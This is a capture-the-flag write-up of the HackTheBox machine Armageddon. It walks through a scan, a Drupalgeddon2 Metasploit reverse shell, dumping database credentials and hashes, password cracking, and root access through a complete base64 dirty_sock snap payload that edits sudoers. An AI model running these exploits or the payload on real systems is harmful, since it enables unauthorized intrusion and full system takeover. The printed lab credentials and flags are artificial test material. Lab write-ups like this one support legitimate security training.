---
title: Armageddon HackTheBox Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2021-05-14 10:02:00 +0800
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, htb, writeup, walkthrough, shellscripting, ssh-keygen, thehackersbrain, nmap]
image:
  src: /assets/armageddon/images/banner.jpg
  alt: HTTP Port Image
---

## Armageddon
> HackTheBox Easy Level Machine

## Target IP
```
export IP=10.10.10.233
```

## Nmap Scan
```
# Nmap 7.91 scan initiated Mon May 10 12:10:56 2021 as: nmap -sC -sV -A -v -oN initial 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 10 12:11:33 2021 -- 1 IP address (1 host up) scanned in 36.98 seconds
```

## HTTP Enumaration (Port 80)
Here's the first look of the site, found that the website is using `drupal 7` via wapplyzer.
![HTTP Port Image](/assets/armageddon/images/http.png)
_HTTP Port Webserver_

found `robots.txt` file on the website which is blocking a ton of files and directories and endpoints as well.

robots.txt file content
```
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html

User-agent: *
Crawl-delay: 10
# CSS, JS, Images
Allow: /misc/*.css$
Allow: /misc/*.css?
Allow: /misc/*.js$
Allow: /misc/*.js?
Allow: /misc/*.gif
Allow: /misc/*.jpg
Allow: /misc/*.jpeg
Allow: /misc/*.png
Allow: /modules/*.css$
Allow: /modules/*.css?
Allow: /modules/*.js$
Allow: /modules/*.js?
Allow: /modules/*.gif
Allow: /modules/*.jpg
Allow: /modules/*.jpeg
Allow: /modules/*.png
Allow: /profiles/*.css$
Allow: /profiles/*.css?
Allow: /profiles/*.js$
Allow: /profiles/*.js?
Allow: /profiles/*.gif
Allow: /profiles/*.jpg
Allow: /profiles/*.jpeg
Allow: /profiles/*.png
Allow: /themes/*.css$
Allow: /themes/*.css?
Allow: /themes/*.js$
Allow: /themes/*.js?
Allow: /themes/*.gif
Allow: /themes/*.jpg
Allow: /themes/*.jpeg
Allow: /themes/*.png
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

### Gobuster Scan Log
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.233
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/10 12:19:16 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/.hta                 (Status: 403) [Size: 206]
/cgi-bin/             (Status: 403) [Size: 210]
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/index.php            (Status: 200) [Size: 7440]                                   
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]    
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/] 
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/robots.txt           (Status: 200) [Size: 2189]                                   
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/] 
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]   
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]  
/web.config           (Status: 200) [Size: 2200]                                   
/xmlrpc.php           (Status: 200) [Size: 42]                                     
===============================================================
2021/05/10 12:21:15 Finished
===============================================================
```

while enumerating the website, I search for `drupal 7` exploits, to see if the website is version is vulnerable, and I found two vulnerabilities, The first one was a `SQLi` vulnerability, for exploiting this we need the credentials of the site, So this was not one we were looking for and the other one was the `RCE` which was from `rapid7` which means we can also get a metasploit module [here](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/). so I downloaded the metasploit, moved it in the `/opt/metasploit/modules/expoits/` folder and then seted up the required field.

Metasploit Setup
```
set lhost 10.10.14.24
set rhosts 10.10.10.233
expoit
```

and here we got our shell.
```
msf6 exploit(drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 10.10.14.24:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.24:4444 -> 10.10.10.233:41766) at 2021-05-10 12:43:38 +0530

meterpreter >
```

## User Flag

found database creds inside the `settings.php` file of `drupal` cms, so let's check if we have something juicy inside.

### Mysql Database Enumeration
```
which mysql
/usr/bin/mysql
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases';
Database
information_schema
drupal
mysql
performance_schema
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables';
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select * from users;'
uid     name    pass    mail    theme   signature       signature_format        created access  login   status timezone language        picture init    data
0                                               NULL    0       0       0       0       NULL            0      NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu    filtered_html    1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
3       admin   $S$DLYq9RytCtwI3byf3JdwqIYaYC5v/GXRW0CzE/0S.LgUQbut1..s admin@armageddon.htb                   filtered_html    1620630610      0       0       0       Europe/London           0       admin@armageddon.htb   NULL
4       Gustavo $S$DV0tVGx0H4Ri7EpOUqyBxq9B0zNTYPdlFRxDEouJClH9C.ilHcFu gustavo@filiberto.it                   filtered_html    1620633213      0       0       0       Europe/London           0       gustavo@filiberto.it   NULL
5       kiratross       $S$DTHR8IwJoEvadhOUdmDaf50diMGPE7cTtVNdsb546xBtLCj7ZhL7 kiratross@gmail.com            filtered_html    1620633215      0       0       0       Europe/London           0       kiratross@gmail.com    NULL
6       GustavoLaPatata $S$DTEpipo67x.PIO2.IGNWBlGrd6jzbFnqwYfOTLnMfTyhzDXsLw0H appariera@kentol.buzz          filtered_html    1620633260      0       0       0       Europe/London           0       appariera@kentol.buzz  NULL
7       mahixot@dropjar.com     $S$DhtDFnu4s0V1RQBOCZkBhYMeccgmS0tPKI2fYnbamnxtQw7SiP6I mahixot@dropjar.com    filtered_html    1620633275      0       0       0       Europe/London           0       mahixot@dropjar.com    NULL
```

and here we got the `password hashes` of the users, one of them is in the `/etc/passwd` file which is `brucetherealadmin`.

### /etc/passwd
```
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

Stored the `hashes` in `userhashes` file and bruteforced it to get the credentials.

### JohnTheRipper Log
```
Loaded 6 password hashes with 6 different salts (Drupal7, $S$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
booboo           (brucetherealadmin)

```

found credential of the user `brucetherealadmin`
creds: `brucetherealadmin:booboo`

and here we got the user flag
```
[elliot@archlinux]  armageddon git:(main) ✗ ssh brucetherealadmin@10.10.10.233
brucetherealadmin@10.10.10.233's password:
Last login: Mon May 10 09:29:17 2021 from 10.10.14.30
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[brucetherealadmin@armageddon ~]$ pwd
/home/brucetherealadmin
[brucetherealadmin@armageddon ~]$ cat user.txt
af2431a00feda63ddbb5622bfccbbd03
[brucetherealadmin@armageddon ~]$
```

## Root Flag
our user `brucetherealadmin` can run `snap` command as `root` without any password. so let's create a snap package which will give us command exection and potentially as `Root` shell.
```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on
    armageddon:
    !visiblepw, always_set_home, match_group_by_gid,
    always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME
    LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands
        on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
[brucetherealadmin@armageddon ~]$
```

- PrivEsc 
  `dirty_sock` privilege escalation via `snapd`

Getting root shell
```
[brucetherealadmin@armageddon ~]$ python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > privesc.snap
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install --devmode privesc.snap
dirty-sock 0.1 installed
[brucetherealadmin@armageddon ~]$ su dirty_sock
Password:
[dirty_sock@armageddon brucetherealadmin]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock:
Matching Defaults entries for dirty_sock on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User dirty_sock may run the following commands on armageddon:
    (ALL : ALL) ALL
[dirty_sock@armageddon brucetherealadmin]$ sudo bash
[root@armageddon brucetherealadmin]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@armageddon brucetherealadmin]# cat /root/root.txt
2c7fd2c3c2d967ddcce0dac8b9e22db8
[root@armageddon brucetherealadmin]#
```
